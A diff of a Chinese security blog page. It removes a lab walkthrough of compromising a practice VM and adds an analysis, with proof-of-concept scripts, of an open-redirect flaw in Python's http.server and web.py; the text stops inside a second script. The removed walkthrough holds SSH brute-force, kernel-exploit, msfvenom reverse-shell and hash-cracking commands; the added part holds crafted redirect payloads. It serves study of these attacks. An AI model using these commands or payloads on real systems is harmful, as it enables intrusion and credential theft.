@@ -101,7 +101,7 @@
 
 
 
-  <meta name="keywords" content="渗透,靶机," />
+  <meta name="keywords" content="渗透,URL跳转,WEB安全,python安全," />
 
 
 
@@ -114,48 +114,31 @@
 
 
 
-<meta name="description" content="靶机渗透 以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。原文链接  搭建环境靶机IP：192.168.0.105 攻击主机IP：192.168.0.106  渗透过程 靶机只有一个登陆界面，所以端口扫描来一波 nmap.exe -sV -p- -T5 192.168.0.105  发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现">
-<meta name="keywords" content="渗透,靶机">
+<meta name="description" content="python: http.server / web.py URL跳转漏洞实践 前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。  HTTP.SERVER python一键启动web服务器 python -m http.server 在任意目录执行上面的命令，可">
+<meta name="keywords" content="渗透,URL跳转,WEB安全,python安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="超级玛丽靶机渗透">
-<meta property="og:url" content="https://www.lsowl.xyz/2018/08/19/靶机渗透/index.html">
+<meta property="og:title" content="URL跳转漏洞白盒实践">
+<meta property="og:url" content="https://www.lsowl.xyz/2018/11/21/URL跳转漏洞白盒实践/index.html">
 <meta property="og:site_name" content="Demos&#39;s Blog">
-<meta property="og:description" content="靶机渗透 以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。原文链接  搭建环境靶机IP：192.168.0.105 攻击主机IP：192.168.0.106  渗透过程 靶机只有一个登陆界面，所以端口扫描来一波 nmap.exe -sV -p- -T5 192.168.0.105  发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现">
+<meta property="og:description" content="python: http.server / web.py URL跳转漏洞实践 前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。  HTTP.SERVER python一键启动web服务器 python -m http.server 在任意目录执行上面的命令，可">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675443.65.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675463.94.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675493.83.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675825.29.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676045.55.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676106.23.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676228.18.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676343.44.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676499.19.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676681.24.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676860.62.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677018.46.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677247.99.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677310.05.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677502.15.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677631.83.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677718.08.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677870.96.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678061.53.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678103.78.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678360.95.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678383.77.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678435.94.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678550.51.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678577.38.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678687.04.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678803.4.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678908.77.png">
-<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534679220.15.png">
-<meta property="og:updated_time" content="2018-08-19T12:21:38.754Z">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png">
+<meta property="og:updated_time" content="2018-11-21T14:21:04.988Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="超级玛丽靶机渗透">
-<meta name="twitter:description" content="靶机渗透 以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。原文链接  搭建环境靶机IP：192.168.0.105 攻击主机IP：192.168.0.106  渗透过程 靶机只有一个登陆界面，所以端口扫描来一波 nmap.exe -sV -p- -T5 192.168.0.105  发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现">
-<meta name="twitter:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675443.65.png">
+<meta name="twitter:title" content="URL跳转漏洞白盒实践">
+<meta name="twitter:description" content="python: http.server / web.py URL跳转漏洞实践 前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。  HTTP.SERVER python一键启动web服务器 python -m http.server 在任意目录执行上面的命令，可">
+<meta name="twitter:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png">
 
 
 
@@ -185,13 +168,13 @@
 
 
 
-  <link rel="canonical" href="https://www.lsowl.xyz/2018/08/19/靶机渗透/"/>
+  <link rel="canonical" href="https://www.lsowl.xyz/2018/11/21/URL跳转漏洞白盒实践/"/>
 
 
 
 
 
-  <title>超级玛丽靶机渗透 | Demos's Blog</title>
+  <title>URL跳转漏洞白盒实践 | Demos's Blog</title>
   
 
 
@@ -362,7 +345,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.lsowl.xyz/2018/08/19/靶机渗透/">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.xyz/2018/11/21/URL跳转漏洞白盒实践/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Demos">
@@ -379,7 +362,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">超级玛丽靶机渗透</h1>
+          <h1 class="post-title" itemprop="name headline">URL跳转漏洞白盒实践</h1>
         
 
         <div class="post-meta">
@@ -391,8 +374,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-19T20:19:26+08:00">
-                2018-08-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T22:18:57+08:00">
+                2018-11-21
               </time>
             
 
@@ -451,58 +434,68 @@
       
 
       
-        <h3 id="靶机渗透"><a href="#靶机渗透" class="headerlink" title="靶机渗透"></a>靶机渗透</h3><blockquote>
-<p>以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。<a href="https://www.anquanke.com/post/id/146527" target="_blank" rel="noopener">原文链接</a></p>
+        <h2 id="python-http-server-web-py-URL跳转漏洞实践"><a href="#python-http-server-web-py-URL跳转漏洞实践" class="headerlink" title="python: http.server / web.py URL跳转漏洞实践"></a>python: http.server / web.py URL跳转漏洞实践</h2><blockquote>
+<p>前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。</p>
 </blockquote>
-<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>靶机IP：192.168.0.105</p>
-<p>攻击主机IP：192.168.0.106</p>
-<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675443.65.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675463.94.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675493.83.png" alt=""></p>
-<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><ul>
-<li><p>靶机只有一个登陆界面，所以端口扫描来一波</p>
-<p><code>nmap.exe -sV -p- -T5 192.168.0.105</code></p>
+<h3 id="HTTP-SERVER"><a href="#HTTP-SERVER" class="headerlink" title="HTTP.SERVER"></a>HTTP.SERVER</h3><ul>
+<li><p>python一键启动web服务器 <code>python -m http.server</code></p>
+<p>在任意目录执行上面的命令，可以启动一个web服务端，模拟一个服务器。这里用到了http.server这个模块</p>
 </li>
-<li><p>发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 <code>sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675825.29.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676045.55.png" alt=""></p>
+<li><p>http.server模块下包含几个类</p>
+<ul>
+<li><code>HTTPServer</code>这个类继承于<code>socketserver.TCPServer</code>，说明其实HTTP服务器本质是一个TCP服务器</li>
+<li><code>BaseHTTPRequestHandler</code>，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作</li>
+<li><code>SimpleHTTPRequestHandler</code>，这个类继承于<code>BaseHTTPRequestHandler</code>，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。</li>
+<li><code>CGIHTTPRequestHandler</code>，这个类继承于<code>SimpleHTTPRequestHandler</code>，在静态文件服务器的基础上，增加了执行CGI脚本的功能。</li>
+</ul>
 </li>
-<li><p>发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676106.23.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676228.18.png" alt=""></p>
+<li><p>http.server的几个类的关系就是下面这样（P牛的图）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png" alt=""></p>
 </li>
-<li><p>然后访问[<a href="http://mario.supermariohost.local:8180/" target="_blank" rel="noopener">http://mario.supermariohost.local:8180/</a> 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676343.44.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676499.19.png" alt=""></p>
+<li><p>通过分析：SimpleHTTPRequestHandler是将用户请求的path返回给用户的，并且它继承了BaseHTTPRequestHandler类的HTTP协议解析的特性，并返回数据包，所以说明http.server这个发生URL跳转会发生在SimpleHTTPRequestHandler的代码中</p>
 </li>
-<li><p>访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取<code>cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676681.24.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676860.62.png" alt=""></p>
+<li><p>分析SimpleHTTPRequestHandler类源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleHTTPRequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    server_version = <span class="string">"SimpleHTTP/"</span> + __version__</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#如果是GET请求就调用do_GET函数，在do_GET中调用了send_head函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Serve a GET request."""</span></span><br><span class="line">        f = self.send_head()</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.copyfile(f, self.wfile)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_head</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#translate_path函数解析用户输入的请求path，判断用户真正请求的文件</span></span><br><span class="line">        path = self.translate_path(self.path)</span><br><span class="line">        f = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#判断用户的请求的文件或目录是否在web服务器的目录中，如果在则进入第一个if语  		 句，如果请求的路径不存在则跳转到web服务的主页</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            <span class="comment">#将用户输入的请求解析过后用rllib.parse.urlsplit拆分，用于后面的判断</span></span><br><span class="line">            parts = urllib.parse.urlsplit(self.path)</span><br><span class="line">            <span class="comment">#判断用户请求的地址是否以'/'结尾，如果是则直接返回相应请求内容，如果不是			 则进入第二个if语句，将用户的请求加上'/'后进行跳转，也是漏洞点</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parts.path.endswith(<span class="string">'/'</span>):</span><br><span class="line">                <span class="comment"># redirect browser - doing basically what apache does</span></span><br><span class="line">                self.send_response(HTTPStatus.MOVED_PERMANENTLY)</span><br><span class="line">                new_parts = (parts[<span class="number">0</span>], parts[<span class="number">1</span>], parts[<span class="number">2</span>] + <span class="string">'/'</span>,</span><br><span class="line">                             parts[<span class="number">3</span>], parts[<span class="number">4</span>])</span><br><span class="line">                new_url = urllib.parse.urlunsplit(new_parts)</span><br><span class="line">                self.send_header(<span class="string">"Location"</span>, new_url)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> <span class="string">"index.html"</span>, <span class="string">"index.htm"</span>:</span><br><span class="line">                index = os.path.join(path, index)</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(index):</span><br><span class="line">                    path = index</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> self.list_directory(path)</span><br><span class="line">        <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><p>利用生成的自定义字典使用john生成一个自定义的密码字典 <code>john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt</code> 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破</p>
-<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677018.46.png" alt=""></p>
-<p><code>hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677247.99.png" alt=""></p>
+<li><p>找到漏洞点在 if not parts.path.endswith(‘/‘)后进一步分析：</p>
+<ul>
+<li>这里的代码逻辑是判断用户请求的一个已经存在的文件是不是以 ‘/’结尾的，如果不是，则加上‘/’进行301跳转。</li>
+<li>现在主流的浏览器访问 <code>//baidu.com</code> 时候会跳转到 <code>baidu.com</code> 会默认认为这个URL是当前数据包的协议，也就是说，这里要跳转，必须要构造成跳转时能解析为一个正常的域名，必须构造成 <code>127.0.0.1:8000//baidu.com</code></li>
+<li>常见的URL跳转应该是<code>127.0.0.1:8000/baidu.com</code>一个斜杠，这里为什么要两个呢；原因在parts = urllib.parse.urlsplit(self.path)这里的分割，可以看到使用双斜杠后将用户的请求解析成一个netlocation,这里就会发生跳转，产生URL跳转漏洞。<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png" alt=""></li>
+</ul>
 </li>
-<li><p>得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677310.05.png" alt=""></p>
+<li><p>现在触发点找到了，还有一个问题，就是初始值的判断，http.server会判断用户访问的资源站内是否存在，绕过这个限制可以让请求跳到下一级目录 <code>/..</code></p>
 </li>
-<li><p>在原文中有一篇关于内网渗透中绕过shell限制的文章：<a href="http://www.4hou.com/penetration/11674.html" target="_blank" rel="noopener">www.4hou.com/penetration/11674.html</a> ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677502.15.png" alt=""></p>
+<li><p>构造payload：<code>127.0.0.1:8000//baidu.com//..</code>(请求后没有跳转到百度，而是跳转到首页，抓包分析)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png" alt=""></p>
+<p>在浏览器直接请求127.0.0.1:8000//baidu.com//..根本不会将/..传到服务器，所以服务器收到的请求是 <code>127.0.0.1:8000//baidu.com/</code> 然后判断站点中不存在用户请求的资源</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png" alt=""></p>
 </li>
-<li><p>然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：<a href="https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行" target="_blank" rel="noopener">https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行</a> <code>gcc 77.c -o test</code> 拿到root权限</p>
-</li>
-<li><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677631.83.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677718.08.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677870.96.png" alt=""></p>
-</li>
-<li><p>提权成功后在root目录下发现了flag.zip,解压发现需要密码：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678061.53.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678103.78.png" alt=""></p>
-</li>
-<li><p>将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行：</p>
-<p><code>sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678360.95.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678383.77.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678435.94.png" alt=""></p>
-</li>
-<li><p>利用fcrackzip爆破压缩包的密码 <code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678550.51.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678577.38.png" alt=""></p>
-</li>
-<li><p>查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来</p>
-<p><code>run post/linux/gather/hashdump</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678687.04.png" alt=""></p>
-</li>
-<li><p>然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成</p>
-<p><code>john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678803.4.png" alt=""></p>
-</li>
-<li><p>加载字典，然后本地破解hash，得到所有的账户密码：</p>
-<p><code>john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678908.77.png" alt=""></p>
-</li>
-<li><p>利用得到的账户密码均登陆成功：渗透完成<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534679220.15.png" alt=""></p>
+<li><p>要让服务端收到的请求中包跳目录的请求，必须进行URL编码：(成功跳转，已经证明漏洞存在，这里的绕过跨目录没法控制，不能调到baidu主页，但是学习思路，证明漏洞存在已经达到目标了)</p>
+<p><code>127.0.0.1:8000//baidu.com/%2f..</code>  或 <code>127.0.0.1:8000//baidu.com/%2f%2e%2e</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png" alt=""></p>
 </li>
 </ul>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
-<p>本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。</p>
-</blockquote>
+<h3 id="web-py框架"><a href="#web-py框架" class="headerlink" title="web.py框架"></a>web.py框架</h3><p>继承并使用了<code>SimpleHTTPRequestHandler</code>类，web.py在处理静态文件的时候会使用SimpleHTTPRequestHandler`类，所以会受到影响</p>
+<ul>
+<li><p>简单的web.py代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/(.*)'</span>, <span class="string">'hello'</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">            name = <span class="string">'World'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello, '</span> + name + <span class="string">'!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png" alt=""></p>
+</li>
+<li><p>模拟真实的生产环境：（web.py的应用中必须是静态文件才有效，所以必须制定css,js,图片等，原原理都是一样的，这里的@代表后面的是域名）</p>
+<p><code>http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f</code>  <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png" alt=""></p>
+</li>
+</ul>
+<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><ul>
+<li><p>http.server——poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#urllib.parse.urlparse代替python2中的urlparse模块中的urlparse.urlparse()方法</span></span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;//example.com/%2f%2e%2e"</span>.format(target)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    poc(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png" alt=""></p>
+</li>
+<li><p>web.py——poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 